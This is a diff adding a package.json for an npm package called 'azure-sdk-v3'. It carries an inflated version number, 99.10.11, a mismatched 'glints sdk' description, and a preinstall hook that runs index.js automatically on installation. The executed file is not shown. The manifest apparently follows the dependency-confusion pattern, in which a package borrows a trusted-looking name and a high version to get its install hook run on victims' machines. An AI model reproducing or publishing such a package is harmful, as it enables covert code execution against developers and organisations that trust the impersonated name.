@@ -1,0 +1,12 @@
+{
+  "name": "azure-sdk-v3",
+  "version": "99.10.11",
+  "description": "glints sdk",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo 'error no test specified' && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
